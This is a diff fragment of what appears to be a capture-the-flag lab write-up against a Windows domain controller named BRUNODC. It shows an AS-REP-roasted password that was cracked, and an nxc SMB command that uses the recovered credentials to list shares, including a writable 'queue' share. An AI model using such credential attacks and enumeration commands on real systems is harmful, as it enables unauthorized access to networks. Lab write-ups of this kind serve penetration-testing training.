@@ -168,5 +168,25 @@ $krb5asrep$23$svc_scan@BRUNO.VL:4a533e557cec89a10844e77f1dd508bb$40614fda7d2d66b
 ```
 The hash cracked!
 
+```python
+svc_scan:Sunshine1
 ```
+I will validate these credentials
+
+
+
+```python
+nxc smb brunodc.bruno.vl -u svc_scan -p 'Sunshine1' --shares       
+SMB         10.129.11.5     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.5     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
+SMB         10.129.11.5     445    BRUNODC          [*] Enumerated shares
+SMB         10.129.11.5     445    BRUNODC          Share           Permissions     Remark
+SMB         10.129.11.5     445    BRUNODC          -----           -----------     ------
+SMB         10.129.11.5     445    BRUNODC          ADMIN$                          Remote Admin
+SMB         10.129.11.5     445    BRUNODC          C$                              Default share
+SMB         10.129.11.5     445    BRUNODC          CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.11.5     445    BRUNODC          IPC$            READ            Remote IPC
+SMB         10.129.11.5     445    BRUNODC          NETLOGON        READ            Logon server share 
+SMB         10.129.11.5     445    BRUNODC          queue           READ,WRITE      
+SMB         10.129.11.5     445    BRUNODC          SYSVOL          READ            Logon server share
 ```
